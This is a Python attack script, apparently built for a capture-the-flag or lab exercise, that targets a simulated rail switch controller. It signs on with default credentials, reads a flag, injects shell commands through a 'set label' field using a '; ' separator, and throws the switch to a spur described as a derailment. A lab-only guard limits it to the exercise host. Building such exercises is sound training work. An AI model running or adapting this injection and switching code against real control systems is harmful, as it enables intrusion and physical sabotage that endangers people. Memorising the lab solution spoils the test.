#!/usr/bin/env python3
"""Drive the Packet River loop/spur switch console.

The switch controller listens on raw TCP 2323 with default creds `maint/maint`,
and its `set label` command shells out on whatever you give it.

    rail_attack.py flag              # sign on, read the maintenance key
    rail_attack.py inject "<cmd>"    # run a shell command via `set label`
    rail_attack.py spur              # throw the switch to the spur (derail)
    rail_attack.py loop              # switch back to the loop
    rail_attack.py restore           # alias for loop

Everything goes through the lab-only guard first.
"""
import re
import socket
import sys
import time

sys.path.insert(0, "/opt/pktr/scripts")
from targets import guard  # noqa: E402

HOST, PORT = "rail-plc", 2323
USER, PW = "maint", "maint"


def session(lines, wait=0.4):
    guard(HOST)
    s = socket.create_connection((HOST, PORT), timeout=6)
    s.settimeout(2)
    out = []

    def drain():
        try:
            while True:
                b = s.recv(4096)
                if not b:
                    break
                out.append(b.decode(errors="replace"))
        except socket.timeout:
            pass

    drain()
    for ln in lines:
        s.sendall((ln + "\r\n").encode())
        time.sleep(wait)
        drain()
    s.close()
    return "".join(out)


def main():
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    cmd = sys.argv[1]

    if cmd == "flag":
        text = session([f"login {USER} {PW}", "flag", "quit"])
        m = re.search(r"PKTR\{[A-Za-z0-9_]+\}", text)
        print(m.group(0) if m else text)
    elif cmd == "inject":
        if len(sys.argv) < 3:
            sys.exit("usage: rail_attack.py inject \"<shell command>\"")
        payload = "; " + sys.argv[2]
        print(session([f"login {USER} {PW}", f"set label {payload}", "quit"]))
    elif cmd in ("spur", "loop", "restore"):
        pos = "loop" if cmd in ("loop", "restore") else "spur"
        print(session([f"login {USER} {PW}", f"set switch {pos}", "status", "quit"]))
    else:
        sys.exit(f"unknown command: {cmd}")


if __name__ == "__main__":
    main()
